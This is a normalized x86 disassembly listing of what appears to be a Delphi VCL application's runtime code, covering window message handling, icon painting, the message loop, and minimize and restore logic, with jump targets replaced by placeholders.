cmp eax [ rw-data ]
je r-xdata
cmp [ esi + 0x59 ] 0x0
je r-xdata
cmp eax 0x1a
jne r-xdata
cmp [ esi + 0x5a ] 0x0
je r-xdata
push 0x400
call SetThreadLocale
call sub_40ec24
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov eax [ edi ]
cmp eax [ rw-data ]
jne r-xdata
mov eax [ rw-data ]
call sub_456514
mov eax [ rw-data ]
call sub_456b94
sub_457898
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4578f5
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x162 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4578fc
lea eax [ ebp - 0x4 ]
call sub_404e44
retn
lea eax [ ebp - 0x4 ]
mov edx [ esi + 0x8 ]
call sub_40503c
mov eax [ ebp - 0x4 ]
push eax
lea eax [ esi + 0xc ]
push eax
mov ecx [ esi + 0x4 ]
mov edx ebx
mov eax [ ebx + 0x164 ]
call [ ebx + 0x160 ]
sub_457904
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call DefWindowProcA
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov [ edx + 0xc ] eax
pop ebp
retn
sub_457940
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call BeginPaint
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_4580a0
push eax
push 0x0
push 0x0
push ebx
call DrawIcon
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call EndPaint
pop ebx
mov esp ebp
pop ebp
retn
sub_45798c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor edx edx
push ebp
push sub_458056
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x8 ]
xor edx edx
mov [ eax + 0xc ] edx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xb0 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_457840
mov ebx [ ebp - 0x8 ]
mov ebx [ ebx ]
mov eax ebx
cmp eax 0x53
jg r-xdata
inc ebx
xor esi esi
cmp eax 0xb017
jg r-xdata
je r-xdata
inc esi
dec ebx
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
cmp eax 0xb020
jg r-xdata
je r-xdata
mov ecx [ ebp - 0x8 ]
mov ecx [ ecx + 0x8 ]
mov edx [ ebp - 0x8 ]
movzx edx [ edx + 0x4 ]
mov eax [ ebp - 0x4 ]
call sub_458cc4
jmp r-xdata
cmp eax 0x14
jg r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xb0 ]
mov edx esi
call sub_4167c8
mov edi eax
mov edx [ ebp - 0x8 ]
mov eax [ edi + 0x4 ]
call [ edi ]
test al al
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub eax 0xb031
je r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
test eax eax
je r-xdata
cmp eax 0xb000
jg r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
cmp eax 0x1d
jg r-xdata
je r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x1
jne r-xdata
add eax 0xfffffff2
sub eax 0x2
jb r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
sub eax 0xb01a
je r-xdata
mov ebx eax
mov eax ebx
call sub_443be8
test eax eax
je r-xdata
sub eax 0xb001
je r-xdata
je r-xdata
sub eax 0x37
je r-xdata
je r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax ] 0x27
push ebp
call sub_457904
pop ecx
jmp r-xdata
cmp eax 0x11
ja r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0xb8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xb8 ]
mov edx [ ebp - 0x8 ]
mov [ edx + 0xc ] eax
jmp r-xdata
mov ecx [ ebp - 0x8 ]
mov ecx [ ecx + 0x8 ]
mov eax [ ebp - 0x8 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_459eb4
and eax 0x7f
mov edx [ ebp - 0x8 ]
mov [ edx + 0xc ] eax
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
mov eax [ ebp - 0x4 ]
call sub_458770
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
mov eax [ ebp - 0x4 ]
call sub_458714
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call IsIconic
test eax eax
jne r-xdata
sub eax 0x5
je r-xdata
mov eax ebx
call sub_443be8
push eax
call IsWindowEnabled
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x132 ] 0x0
je r-xdata
sub eax 0x15
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x13a ] 0x0
je r-xdata
sub eax 0x112
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_4580a0
mov edx [ ebp - 0x8 ]
mov [ edx + 0xc ] eax
jmp r-xdata
sub eax 0x13
je r-xdata
mov eax [ rw-data ]
call sub_456b94
push ebp
call sub_457904
pop ecx
jmp r-xdata
sub eax 0x16
je r-xdata
push ebp
call sub_457904
pop ecx
jmp [ eax * 4 + jump_table_457a30 ]
call GetFocus
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x30 ]
jne r-xdata
jmp r-xdata
mov eax ebx
call sub_443be8
push eax
call IsWindowVisible
test eax eax
je r-xdata
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x134 ]
call [ ebx + 0x130 ]
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4584d4
test al al
je r-xdata
jmp r-xdata
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x13c ]
call [ ebx + 0x138 ]
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
and eax 0xfff0
sub eax 0xf020
je r-xdata
add eax 0xffffffe0
sub eax 0x7
jb r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
cmp [ eax ] 0xde534454
jne r-xdata
jmp r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
sub eax 0x4
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call IsIconic
test eax eax
je r-xdata
push 0x0
push 0x0
push 0xb01a
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call PostMessageA
push ebp
call sub_457904
pop ecx
jmp r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0x1
jmp r-xdata
xor eax eax
call sub_41d278
jmp r-xdata
xor eax eax
call sub_44e4b8
test eax eax
je r-xdata
mov [ rw-data ] 0x0
call GetFocus
mov esi eax
mov eax ebx
call sub_443be8
push eax
call SetFocus
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
push eax
mov ecx [ ebp - 0x8 ]
mov ecx [ ecx + 0x4 ]
mov edx 0x112
mov eax ebx
call sub_43d400
push esi
call SetFocus
mov [ rw-data ] 0x1
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0x1
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0x1
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_4580bc
jmp r-xdata
sub eax 0x100
je r-xdata
mov esi [ ebp - 0x8 ]
mov esi [ esi + 0x8 ]
push esi
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
add ebx 0xbc00
push ebx
mov eax [ ebp - 0x8 ]
push esi
call SendMessageA
mov edx [ ebp - 0x8 ]
mov [ edx + 0xc ] eax
jmp r-xdata
sub eax 0x1e1
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xa6 ] 0x0
je r-xdata
call sub_40f3e0
call sub_404c9c
mov edx [ ebp - 0x8 ]
mov edx [ edx + 0x4 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_448da0
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_457898
push ebp
call sub_457904
pop ecx
jmp r-xdata
sub eax 0x2
je r-xdata
call sub_454bfc
jmp r-xdata
push ebp
call sub_457904
pop ecx
jmp r-xdata
push ebp
call sub_457940
pop ecx
jmp r-xdata
push ebp
call sub_457904
pop ecx
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xb4 ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
push eax
call SetFocus
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_458180
jmp r-xdata
jmp r-xdata
call sub_42f0b8
call sub_42f21c
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xa8 ] 0x0
jne r-xdata
push ebp
call sub_457904
pop ecx
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x1
sbb eax eax
inc eax
mov edx [ ebp - 0x4 ]
mov [ edx + 0xa5 ] al
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_457614
jmp r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
push ebp
call sub_457904
pop ecx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_45766c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xb4 ]
test eax eax
je r-xdata
push ebp
call sub_457904
pop ecx
jmp r-xdata
mov eax [ ebp - 0x8 ]
xor edx edx
mov [ eax + 0xc ] edx
jmp r-xdata
mov edx 0x8000
mov eax r-xdata
call sub_40f988
mov ebx eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0xa8 ] ebx
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_45760c
push 0x0
push 0x0
push 0xb001
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call PostMessageA
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_45766c
push 0x0
push 0x0
push 0xb000
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call PostMessageA
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_44e358
mov edx [ ebp - 0x4 ]
mov [ edx + 0xb4 ] eax
call sub_44e41c
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0xb4 ] edx
call GetLastError
mov edx [ ebp - 0x8 ]
mov [ edx + 0xc ] eax
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0xa8 ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
xor edx edx
mov [ eax + 0xc ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xa8 ]
push eax
call GetProcAddress
mov esi eax
mov ebx esi
test esi esi
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
mov edx [ eax + 0x8 ]
push edx
mov edx [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
call ebx
jmp r-xdata
sub_4580bc
push ebx
mov ebx eax
mov eax [ ebx + 0x30 ]
push eax
call IsIconic
test eax eax
jne r-xdata
pop ebx
retn
mov eax ebx
call sub_45760c
mov eax [ ebx + 0x30 ]
push eax
call SetActiveWindow
xor edx edx
mov eax ebx
call sub_457748
cmp [ ebx + 0x44 ] 0x0
je r-xdata
mov edx 0x6
mov eax [ ebx + 0x30 ]
call sub_456e14
cmp [ ebx + 0x5b ] 0x0
jne r-xdata
mov edx ebx
mov eax [ ebx + 0x144 ]
call [ ebx + 0x140 ]
mov eax [ ebx + 0x44 ]
call sub_443be8
push eax
call IsWindowEnabled
test eax eax
je r-xdata
mov eax [ ebx + 0x44 ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
push 0x40
push 0x0
mov eax [ ebx + 0x44 ]
mov eax [ eax + 0x48 ]
push eax
mov eax [ ebx + 0x44 ]
call sub_4506f8
push eax
mov eax [ ebx + 0x44 ]
call sub_4506d8
push eax
mov eax [ ebx + 0x44 ]
call sub_443be8
push eax
mov eax [ ebx + 0x30 ]
push eax
call SetWindowPos
push 0x0
push 0xf020
push 0x112
mov eax [ ebx + 0x30 ]
push eax
call DefWindowProcA
jmp r-xdata
cmp [ ebx + 0x142 ] 0x0
je r-xdata
sub_458180
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x30 ]
push eax
call IsIconic
test eax eax
je r-xdata
pop esi
pop ebx
retn
mov eax [ ebx + 0x30 ]
push eax
call SetActiveWindow
cmp [ ebx + 0x44 ] 0x0
je r-xdata
mov edx 0x9
mov eax [ ebx + 0x30 ]
call sub_456e14
cmp [ ebx + 0x5b ] 0x0
jne r-xdata
push eax
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
sar eax 0x1
jns r-xdata
adc eax 0x0
mov eax [ ebx + 0x44 ]
call sub_443be8
push eax
call IsWindowEnabled
test eax eax
je r-xdata
mov eax [ ebx + 0x44 ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
push eax
push 0x0
mov eax [ ebx + 0x30 ]
push eax
call SetWindowPos
mov eax [ ebx + 0x44 ]
test eax eax
je r-xdata
adc eax 0x0
push 0x0
push 0xf120
push 0x112
mov eax [ ebx + 0x30 ]
push eax
call DefWindowProcA
jmp r-xdata
mov eax ebx
call sub_45766c
mov dl 0x1
mov eax ebx
call sub_457748
mov eax [ rw-data ]
mov esi [ eax + 0x64 ]
test esi esi
je r-xdata
cmp [ eax + 0x273 ] 0x1
jne r-xdata
push 0x40
push 0x0
push 0x0
push 0x1
mov eax [ rw-data ]
mov eax [ eax ]
call eax
sar eax 0x1
jns r-xdata
cmp [ ebx + 0x14a ] 0x0
je r-xdata
mov eax esi
call sub_443be8
push eax
call SetFocus
cmp [ eax + 0x57 ] 0x0
jne r-xdata
mov edx ebx
mov eax [ ebx + 0x14c ]
call [ ebx + 0x148 ]
xor edx edx
call sub_452354
mov eax [ ebx + 0x44 ]
call sub_454da4
sub_45828c
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
pop esi
pop ebx
retn
push eax
call GetLastActivePopup
mov esi eax
test esi esi
je r-xdata
cmp esi [ ebx + 0x30 ]
je r-xdata
push esi
call IsWindowVisible
test eax eax
je r-xdata
push esi
call IsWindowEnabled
test eax eax
je r-xdata
push esi
call SetForegroundWindow
sub_4582c8
push ebx
push esi
add esp 0xffffff00
mov esi edx
mov ebx eax
cmp [ ebx + 0xac ] 0x0
je r-xdata
mov eax esi
mov edx [ ebx + 0x8c ]
call sub_404e98
push 0x100
lea eax [ esp + 0x4 ]
push eax
mov eax [ ebx + 0x30 ]
push eax
call GetWindowTextA
mov ecx eax
mov edx esp
mov eax esi
call sub_404f34
jmp r-xdata
add esp 0x100
pop esi
pop ebx
retn
sub_458314
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
cmp [ ebx + 0xb8 ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov eax [ esi ]
push eax
call IsWindowUnicode
test eax eax
je r-xdata
push esi
mov eax [ ebx + 0xb8 ]
push eax
call IsDialogMessageA
cmp eax 0x1
sbb eax eax
inc eax
push esi
mov eax [ ebx + 0xb8 ]
push eax
call IsDialogMessageW
cmp eax 0x1
sbb eax eax
inc eax
jmp r-xdata
sub_45835c
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ esi + 0x277 ] 0x2
jne r-xdata
mov edx [ rw-data ]
cmp [ edx + 0x6c ] 0x0
je r-xdata
mov edx [ rw-data ]
mov edx [ edx + 0x6c ]
cmp [ edx + 0x277 ] 0x1
jne r-xdata
push edi
mov eax [ esi + 0x29c ]
push eax
call TranslateMDISysAccel
cmp eax 0x1
sbb eax eax
inc eax
sub_4583ac
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov esi edx
mov edi eax
xor ebx ebx
mov eax [ esi + 0x4 ]
cmp eax 0x100
jb r-xdata
mov eax ebx
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
cmp eax 0x109
ja r-xdata
call GetCapture
mov ebp eax
test ebp ebp
jne r-xdata
push esp
push ebp
call GetWindowThreadProcessId
lea eax [ esp + 0x4 ]
push eax
mov eax [ edi + 0x30 ]
push eax
call GetWindowThreadProcessId
mov eax [ esp ]
cmp eax [ esp + 0x4 ]
jne r-xdata
mov ebp [ esi ]
mov eax [ edi + 0x44 ]
test eax eax
je r-xdata
mov eax [ esi + 0xc ]
push eax
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
add eax 0xbc00
push eax
push ebp
call SendMessageA
test eax eax
je r-xdata
mov eax ebp
call sub_438bf4
test al al
jne r-xdata
cmp ebp [ eax + 0x29c ]
jne r-xdata
mov bl 0x1
test ebp ebp
jne r-xdata
test ebp ebp
jne r-xdata
call sub_443be8
mov ebp eax
jmp r-xdata
push ebp
call IsWindowUnicode
test eax eax
je r-xdata
mov ebp [ esi ]
push ebp
call GetParent
mov ebp eax
mov eax [ esi + 0xc ]
push eax
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
add eax 0xbc00
push eax
push ebp
call __imp_SendMessageA
test eax eax
je r-xdata
mov eax [ esi + 0xc ]
push eax
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
add eax 0xbc00
push eax
push ebp
call SendMessageW
test eax eax
je r-xdata
mov bl 0x1
jmp r-xdata
mov bl 0x1
jmp r-xdata
sub_4584a0
push ebx
push esi
push edi
push ebp
mov edi edx
mov ebp eax
xor ebx ebx
mov esi [ ebp + 0x84 ]
test esi esi
je r-xdata
mov eax ebx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0xec ]
test al al
je r-xdata
mov eax ebp
call sub_4596f0
sub_4584d4
push ebx
push esi
push edi
push ebp
push ecx
mov ebp edx
mov ebx eax
mov [ esp ] 0x0
cmp [ ebx + 0x152 ] 0x0
je r-xdata
cmp [ esp ] 0x0
jne r-xdata
mov ecx esp
mov edx ebp
mov eax [ ebx + 0x154 ]
call [ ebx + 0x150 ]
mov al 0x1
mov edi [ ebx + 0x44 ]
test edi edi
je r-xdata
xor eax eax
jmp r-xdata
mov eax edi
call sub_443be8
push eax
call IsWindowEnabled
test eax eax
je r-xdata
mov [ esp ] al
movzx eax [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx ebp
mov eax [ ebx + 0x44 ]
mov si 0xffa5
call sub_404160
test al al
jne r-xdata
sub_458540
push ebx
push esi
push edi
push ebp
mov ebp edx
mov esi eax
mov eax [ ebp ]
sub eax 0x11
je r-xdata
mov [ ebp + 0xc ] 0x1
sub eax 0xb038
jne r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ esi + 0xd0 ]
call sub_406250
test eax eax
jl r-xdata
inc eax
xor ebx ebx
inc ebx
dec eax
jne r-xdata
mov edx [ esi + 0xd0 ]
cmp [ edx + edi * 4 + 0x4 ] 0x0
je r-xdata
lea edi [ ebx + ebx * 2 ]
mov edx [ esi + 0xd0 ]
mov edx [ edx + edi * 4 ]
cmp edx [ ebp + 0x4 ]
jne r-xdata
jmp r-xdata
mov eax [ esi + 0xd0 ]
cmp [ eax + edi * 4 + 0x8 ] 0x0
je r-xdata
mov eax [ esi + 0xd0 ]
mov eax [ eax + edi * 4 + 0x4 ]
call sub_443bc4
mov eax [ esi + 0xd0 ]
mov eax [ eax + edi * 4 + 0x4 ]
call sub_440ab4
jmp r-xdata
mov eax [ esi + 0xd0 ]
mov eax [ eax + edi * 4 + 0x4 ]
mov edx [ ebp + 0x8 ]
call sub_454e48
jmp r-xdata
sub_4585dc
push ebx
push esi
push edi
push ebp
push ecx
mov edi edx
mov esi eax
xor ebx ebx
push 0x0
push 0x0
push 0x0
push 0x0
push edi
call PeekMessageA
test eax eax
je r-xdata
mov eax ebx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov ebp [ edi ]
test ebp ebp
je r-xdata
xor eax eax
jmp r-xdata
push ebp
call IsWindowUnicode
test eax eax
jne r-xdata
mov [ esp ] al
cmp [ esp ] 0x0
je r-xdata
mov al 0x1
push 0x1
push 0x0
push 0x0
push 0x0
push edi
call PeekMessageA
cmp eax 0x1
sbb eax eax
inc eax
push 0x1
push 0x0
push 0x0
push 0x0
push edi
call PeekMessageW
cmp eax 0x1
sbb eax eax
inc eax
jmp r-xdata
mov bl 0x1
cmp [ edi + 0x4 ] 0x12
je r-xdata
test al al
je r-xdata
mov [ esi + 0xa4 ] 0x1
mov [ esp + 0x1 ] 0x0
cmp [ esi + 0x102 ] 0x0
je r-xdata
mov edx edi
mov eax esi
call sub_45a018
test al al
jne r-xdata
lea ecx [ esp + 0x1 ]
mov edx edi
mov eax [ esi + 0x104 ]
call [ esi + 0x100 ]
mov edx edi
mov eax esi
call sub_4584a0
test al al
jne r-xdata
cmp [ esp + 0x1 ] 0x0
jne r-xdata
mov edx edi
mov eax esi
call sub_45835c
test al al
jne r-xdata
mov edx edi
mov eax esi
call sub_4583ac
test al al
jne r-xdata
mov edx edi
mov eax esi
call sub_458314
test al al
jne r-xdata
push edi
call TranslateMessage
cmp [ esp ] 0x0
je r-xdata
push edi
call DispatchMessageA
jmp r-xdata
push edi
call DispatchMessageW
jmp r-xdata
sub_4586f0
push ebx
add esp 0xffffffe4
mov ebx eax
mov edx esp
mov eax ebx
call sub_4585dc
test al al
jne r-xdata
add esp 0x1c
pop ebx
retn
mov edx esp
mov eax ebx
call sub_459124
sub_458714
push ebp
mov ebp esp
push ebx
mov ebx eax
cmp [ ebx + 0xac ] 0x0
jne r-xdata
mov eax [ ebx + 0xb0 ]
call sub_4167a8
mov eax 0x8
call sub_402d28
mov edx [ ebp + 0x8 ]
mov [ eax ] edx
mov edx [ ebp + 0xc ]
mov [ eax + 0x4 ] edx
mov edx eax
mov eax [ ebx + 0xb0 ]
call sub_416668
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
pop ebx
pop ebp
retn 0x8
lea edx [ ebp + 0x8 ]
push edx
push 0x0
push 0xb020
push eax
call SendMessageA
jmp r-xdata
sub_458770
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx eax
cmp [ ebx + 0xac ] 0x0
jne r-xdata
mov eax [ ebx + 0xb0 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
inc edi
xor esi esi
lea edx [ ebp + 0x8 ]
push edx
push 0x1
push 0xb020
push eax
call SendMessageA
jmp r-xdata
inc esi
dec edi
jne r-xdata
mov edx [ ebp + 0xc ]
cmp edx [ eax + 0x4 ]
jne r-xdata
mov edx esi
mov eax [ ebx + 0xb0 ]
call sub_4167c8
mov edx [ eax ]
cmp edx [ ebp + 0x8 ]
jne r-xdata
mov edx 0x8
call sub_402d44
mov edx esi
mov eax [ ebx + 0xb0 ]
call sub_4166b4
jmp r-xdata
sub_458804
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
mov eax ebx
call [ eax - 0xc ]
mov ebx eax
mov eax [ ebp - 0x4 ]
mov [ eax ] ebx
xor eax eax
push ebp
push sub_458842
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx esi
or edx 0xffffffff
mov eax ebx
mov edi [ eax ]
call [ edi + 0x2c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
cmp [ esi + 0x44 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax ebx
mov edx [ r-xdata ]
call sub_4040f0
test al al
je r-xdata
mov edi ebx
mov eax edi
call sub_443bc4
mov [ esi + 0x44 ] edi
sub_458884
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0xad ] 0x1
xor edx edx
push ebp
push sub_458962
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax sub_44e2d0
call sub_409010
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_458969
mov eax [ ebp - 0x4 ]
mov [ eax + 0xad ] 0x0
retn
mov edx [ rw-data ]
mov edx [ edx ]
sub edx 0x3
je r-xdata
mov dl 0x2
call sub_452354
sub edx 0x4
jne r-xdata
xor eax eax
push ebp
push sub_458929
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_4586f0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
cmp [ eax + 0x273 ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x5b ] 0x0
je r-xdata
mov [ eax + 0x273 ] 0x1
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xa4 ] 0x0
je r-xdata
mov dl 0x1
call sub_450b48
mov eax [ ebp - 0x4 ]
call sub_4580bc
jmp r-xdata
sub_458984
push ebx
push esi
add esp 0xfffffe00
mov esi edx
call sub_403e3c
mov ebx eax
jmp r-xdata
test ebx ebx
je r-xdata
test ebx ebx
setne al
add esp 0x200
pop esi
pop ebx
retn
mov edx esp
mov eax ebx
call sub_403e44
mov eax esp
push eax
lea edx [ esp + 0x104 ]
mov eax esi
call sub_403e44
lea edx [ esp + 0x104 ]
pop eax
movzx ecx [ eax ]
inc ecx
call sub_4036b8
jne r-xdata
mov eax ebx
call sub_403ef0
mov ebx eax
sub_4589e0
push ebx
push esi
mov esi edx
mov ebx eax
call GetCapture
test eax eax
je r-xdata
call sub_402dac
mov edx [ r-xdata ]
call sub_458984
test al al
je r-xdata
push 0x0
push 0x0
push 0x1f
call GetCapture
push eax
call SendMessageA
call sub_402dcc
push eax
call sub_402dac
pop edx
call sub_40daec
call sub_402dac
mov edx [ r-xdata ]
call sub_458984
test al al
jne r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0xea ] 0x0
je r-xdata
call sub_402dac
mov edx eax
mov eax ebx
call sub_458bec
pop esi
pop ebx
retn
call sub_402dac
mov ecx eax
mov edx esi
mov eax [ ebx + 0xec ]
call [ ebx + 0xe8 ]
jmp r-xdata
sub_458a70
push ebp
mov ebp esp
add esp 0xffffffa8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov edi edx
mov [ ebp - 0x4 ] eax
mov esi [ ebp + 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_459e2c
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
mov ebx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x30 ]
jmp r-xdata
mov eax [ ebp - 0x10 ]
call sub_44e358
mov [ ebp - 0x14 ] eax
call sub_44e274
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x4 ]
call sub_457810
test al al
je r-xdata
mov [ ebp - 0x48 ] 0x28
lea eax [ ebp - 0x48 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
lea eax [ ebp - 0x58 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call GetWindowRect
push 0x1d
push 0x0
push 0x0
mov ecx [ ebp - 0x38 ]
mov edx [ ebp - 0x40 ]
sub ecx edx
sar ecx 0x1
jns r-xdata
push 0x2
mov eax [ ebp - 0x10 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov [ ebp - 0x18 ] eax
push 0x2
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
